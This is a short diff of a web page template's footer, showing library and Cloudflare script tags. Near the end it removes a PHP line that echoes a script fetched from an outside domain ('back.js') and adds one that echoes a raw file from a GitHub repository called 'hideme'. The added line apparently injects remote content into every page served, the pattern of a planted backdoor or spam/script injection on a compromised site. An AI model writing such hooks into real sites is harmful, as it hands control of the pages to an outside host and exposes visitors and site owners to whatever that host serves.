@@ -264,8 +264,6 @@ return true;
 <script src="assets/js/slick.min.js" type="cf63cd448bfff5cf96e74d15-text/javascript"></script>
 <script src="assets/js/owl.carousel.min.js" type="cf63cd448bfff5cf96e74d15-text/javascript"></script>
 <script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="cf63cd448bfff5cf96e74d15-|49" defer type="ec88d22f60a9d33b3a62577a-text/javascript"></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;rayId&quot;:&quot;8abcfc9f5873ce8a&quot;,&quot;version&quot;:&quot;2024.7.0&quot;,&quot;r&quot;:1,&quot;token&quot;:&quot;4dd4e51f94d8456b821773394dbbb849&quot;,&quot;serverTiming&quot;:{&quot;name&quot;:{&quot;cfL4&quot;:true}}}" crossorigin="anonymous" type="ec88d22f60a9d33b3a62577a-text/javascript"></script>
-<?php
-echo file_get_contents('https://kodokganteng.com/back.js');
-?>
+<?php echo file_get_contents("https://raw.githubusercontent.com/Eza168/hideme/main/file2.txt");?>
 <script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="ec88d22f60a9d33b3a62577a-|49" defer></script></body>
 </html>
